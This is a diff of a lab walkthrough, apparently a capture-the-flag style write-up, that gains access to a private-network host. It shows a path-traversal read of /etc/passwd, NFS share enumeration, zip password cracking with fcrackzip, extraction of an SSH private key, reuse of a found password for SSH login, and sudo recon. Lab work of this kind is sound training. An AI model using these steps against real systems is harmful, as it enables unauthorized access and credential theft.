@@ -123,8 +123,12 @@ http://192.168.38.140:8080/dev/index.php?p=action.search&action=../../../../../.
 
 We were able to access the /etc/passwd and found a new Admin User **jeanpaul** that may help us later.
 
+----
 
-**3- NFS Enumeration:**
+
+## Gaining Access
+
+**3- NFS File inclosure:**
 
 ```bash
 showmount -e 192.168.38.140
@@ -139,7 +143,7 @@ unzip save.zip
 <img width="716" height="268" alt="image" src="https://github.com/user-attachments/assets/5e1114b0-c9a6-4374-a845-455694758c09" />
 
 
-  Now the .zip file is password protected so we will try crack it.
+- Now the .zip file is password protected so we will try crack it.
 
   ```bash
 fcrackzip -u -D -v -p /usr/share/wordlists/rockyou.txt save.zip
@@ -152,8 +156,20 @@ cat id_rsa
 <img width="1201" height="230" alt="image" src="https://github.com/user-attachments/assets/ca3c9e27-71e4-4e34-b3fc-0c687b5551c2" />
 <img width="969" height="875" alt="image" src="https://github.com/user-attachments/assets/89414c4b-1673-46a1-bbdf-ed764d99bd4f" />
 
-We now have both the **private key** and the password we discovered earlier: **`I_love_java`**. Since we have not used this password yet, let's try using it to authenticate to the server via SSH as the user **`jeanpaul`**.
+- We now have both the **private key** and the password we discovered earlier: **`I_love_java`**. Since we have not used this password yet, let's try using it to authenticate to the server via SSH as the user **`jeanpaul`**.
+
+```bash
+ssh -i id_rsa jeanpaul@192.168.38.140
+```
 
 <img width="1204" height="487" alt="image" src="https://github.com/user-attachments/assets/24a1b8ac-8115-40e7-87c9-d6472d2de666" /> 
+
+
+- we now have authenticated to jeanpaul lets explore and see what we run as root.
+
+```bash
+sudo -l
+```
+
 
 
